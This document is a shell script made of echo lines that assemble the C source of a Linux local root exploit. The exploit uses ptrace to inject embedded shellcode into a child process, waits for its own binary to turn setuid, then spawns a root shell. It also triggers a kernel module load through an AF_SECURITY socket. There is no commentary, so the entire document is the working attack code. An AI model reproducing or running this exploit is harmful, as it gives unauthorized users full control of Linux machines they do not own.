echo "#include <grp.h>">>a.c
echo "#include <stdio.h>">>a.c
echo "#include <fcntl.h>">>a.c
echo "#include <errno.h>">>a.c
echo "#include <paths.h>">>a.c
echo "#include <string.h>">>a.c
echo "#include <stdlib.h>">>a.c
echo "#include <signal.h>">>a.c
echo "#include <unistd.h>">>a.c
echo "#include <sys/wait.h>">>a.c
echo "#include <sys/stat.h>">>a.c
echo "#include <sys/param.h>">>a.c
echo "#include <sys/types.h>">>a.c
echo "#include <sys/ptrace.h>">>a.c
echo "#include <sys/socket.h>">>a.c
echo "#include <linux/user.h>">>a.c
echo "  ">>a.c
echo "char cliphcode[] =">>a.c
echo "	"\x90\x90\xeb\x1f\xb8\xb6\x00\x00"">>a.c
echo "	"\x00\x5b\x31\xc9\x89\xca\xcd\x80"">>a.c
echo "	"\xb8\x0f\x00\x00\x00\xb9\xed\x0d"">>a.c
echo "	"\x00\x00\xcd\x80\x89\xd0\x89\xd3"">>a.c
echo "	"\x40\xcd\x80\xe8\xdc\xff\xff\xff";">>a.c
echo "  ">>a.c
echo "#define CODE_SIZE (sizeof(cliphcode) - 1)">>a.c
echo "  ">>a.c
echo "pid_t parent = 1;">>a.c
echo "pid_t child = 1;">>a.c
echo "pid_t victim = 1;">>a.c
echo "volatile int gotchild = 0;">>a.c
echo "  ">>a.c
echo "void fatal(char * msg)">>a.c
echo "{">>a.c
echo "	perror(msg);">>a.c
echo "	kill(parent, SIGKILL);">>a.c
echo "	kill(child, SIGKILL);">>a.c
echo "	kill(victim, SIGKILL);">>a.c
echo "}">>a.c
echo "  ">>a.c
echo "void putcode(unsigned long * dst)">>a.c
echo "{">>a.c
echo "	char buf[MAXPATHLEN + CODE_SIZE];">>a.c
echo "	unsigned long * src;">>a.c
echo "	int i, len;">>a.c
echo "  ">>a.c
echo "	memcpy(buf, cliphcode, CODE_SIZE);">>a.c
echo "	len = readlink("/proc/self/exe", buf + CODE_SIZE, MAXPATHLEN - 1);">>a.c
echo "	if (len == -1)">>a.c
echo "		fatal("[-] Unable to read /proc/self/exe");">>a.c
echo "  ">>a.c
echo "	len += CODE_SIZE + 1;">>a.c
echo "	buf[len] = '\0';">>a.c
echo "  ">>a.c
echo "	src = (unsigned long*) buf;">>a.c
echo "	for (i = 0; i < len; i += 4)">>a.c
echo "		if (ptrace(PTRACE_POKETEXT, victim, dst++, *src++) == -1)">>a.c
echo "			fatal("[-] Unable to write shellcode");">>a.c
echo "}">>a.c
echo "  ">>a.c
echo "void sigchld(int signo)">>a.c
echo "{">>a.c
echo "	struct user_regs_struct regs;">>a.c
echo "  ">>a.c
echo "	if (gotchild++ == 0)">>a.c
echo "		return;">>a.c
echo "  ">>a.c
echo "	fprintf(stderr, "[+] Signal caught\n");">>a.c
echo "  ">>a.c
echo "	if (ptrace(PTRACE_GETREGS, victim, NULL, &regs) == -1)">>a.c
echo "		fatal("[-] Unable to read registers");">>a.c
echo "  ">>a.c
echo "	fprintf(stderr, "[+] Shellcode placed at 0x%08lx\n", regs.eip);">>a.c
echo "  ">>a.c
echo "	putcode((unsigned long *)regs.eip);">>a.c
echo "  ">>a.c
echo "	fprintf(stderr, "[+] Now wait for suid shell...\n");">>a.c
echo "  ">>a.c
echo "	if (ptrace(PTRACE_DETACH, victim, 0, 0) == -1)">>a.c
echo "		fatal("[-] Unable to detach from victim");">>a.c
echo "  ">>a.c
echo "	exit(0);">>a.c
echo "}">>a.c
echo "  ">>a.c
echo "void sigalrm(int signo)">>a.c
echo "{">>a.c
echo "	errno = ECANCELED;">>a.c
echo "	fatal("[-] Fatal error");">>a.c
echo "}">>a.c
echo "  ">>a.c
echo "void do_child(void)">>a.c
echo "{">>a.c
echo "	int err;">>a.c
echo "  ">>a.c
echo "	child = getpid();">>a.c
echo "	victim = child + 1;">>a.c
echo "  ">>a.c
echo "	signal(SIGCHLD, sigchld);">>a.c
echo "  ">>a.c
echo "	do">>a.c
echo "		err = ptrace(PTRACE_ATTACH, victim, 0, 0);">>a.c
echo "	while (err == -1 && errno == ESRCH);">>a.c
echo "  ">>a.c
echo "	if (err == -1)">>a.c
echo "		fatal("[-] Unable to attach");">>a.c
echo "  ">>a.c
echo "	fprintf(stderr, "[+] Attached to %d\n", victim);">>a.c
echo "	while (!gotchild) ;">>a.c
echo "	if (ptrace(PTRACE_SYSCALL, victim, 0, 0) == -1)">>a.c
echo "		fatal("[-] Unable to setup syscall trace");">>a.c
echo "	fprintf(stderr, "[+] Waiting for signal\n");">>a.c
echo "  ">>a.c
echo "	for(;;);">>a.c
echo "}">>a.c
echo "  ">>a.c
echo "void do_parent(char * progname)">>a.c
echo "{">>a.c
echo "	struct stat st;">>a.c
echo "	int err;">>a.c
echo "	errno = 0;">>a.c
echo "	socket(AF_SECURITY, SOCK_STREAM, 1);">>a.c
echo "	do {">>a.c
echo "		err = stat(progname, &st);">>a.c
echo "	} while (err == 0 && (st.st_mode & S_ISUID) != S_ISUID);">>a.c
echo "  ">>a.c
echo "	if (err == -1)">>a.c
echo "		fatal("[-] Unable to stat myself");">>a.c
echo "  ">>a.c
echo "	alarm(0);">>a.c
echo "	system(progname);">>a.c
echo "}">>a.c
echo "  ">>a.c
echo "void prepare(void)">>a.c
echo "{">>a.c
echo "	if (geteuid() == 0) {">>a.c
echo "		initgroups("root", 0);">>a.c
echo "		setgid(0);">>a.c
echo "		setuid(0);">>a.c
echo "		execl(_PATH_BSHELL, _PATH_BSHELL, NULL);">>a.c
echo "		fatal("[-] Unable to spawn shell");">>a.c
echo "	}">>a.c
echo "}">>a.c
echo "  ">>a.c
echo "int main(int argc, char ** argv)">>a.c
echo "{">>a.c
echo "	prepare();">>a.c
echo "	signal(SIGALRM, sigalrm);">>a.c
echo "	alarm(10);">>a.c
echo "  ">>a.c
echo "	parent = getpid();">>a.c
echo "	child = fork();">>a.c
echo "	victim = child + 1;">>a.c
echo "  ">>a.c
echo "	if (child == -1)">>a.c
echo "		fatal("[-] Unable to fork");">>a.c
echo "  ">>a.c
echo "	if (child == 0)">>a.c
echo "		do_child();">>a.c
echo "	else">>a.c
echo "		do_parent(argv[0]);">>a.c
echo "  ">>a.c
echo "	return 0;">>a.c
echo "}">>a.c